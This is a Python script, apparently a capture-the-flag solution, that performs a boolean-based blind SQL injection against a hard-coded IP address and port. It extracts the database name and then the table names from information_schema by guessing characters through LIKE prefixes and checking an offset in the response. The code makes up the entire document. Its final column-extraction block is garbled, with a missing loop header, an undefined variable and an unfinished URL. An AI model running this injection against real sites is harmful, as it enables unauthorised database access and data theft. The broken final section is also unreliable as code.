```python
import requests

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789-,_"
# Database
dbname = ''
for _ in range(10):
    tmp = dbname
    for i in alphabet:
        url = "http://111.74.9.131:18027/index.php?type=in(if("
        url += "(database() like '" + dbname + i + "%')"
        url += ", '14', '15'))"

        resp = requests.get(url)

        if resp.text.index('$15') != 589:
            dbname += i
            break
    if dbname == tmp:
        break

print(dbname) # CTF

# tablename
tablename = ''
for _ in range(20):
    tmp = tablename
    for i in alphabet:
        url = "http://111.74.9.131:18027/index.php?type=in(if("
        url += "((select group_concat(table_name,',') from information_schema.tables where table_schema=database()) like '" + tablename + i + "%')"
        url += ", '14', '15'))"

        resp = requests.get(url)

        if resp.text.index('$15') != 589:
            print(_, end='')
            tablename += i
            break
    if tablename == tmp:
        break

print(tablename) # fl444444g

# columnname

    tmp = columnname
    for i in alphabet:
        url = "http://111.74.9.131:18027/index.php?type=in(if("

        resp = requests.get(url)

        if resp.text.index('$15') != 589:
            print(_, end='')

print(columnname)
```
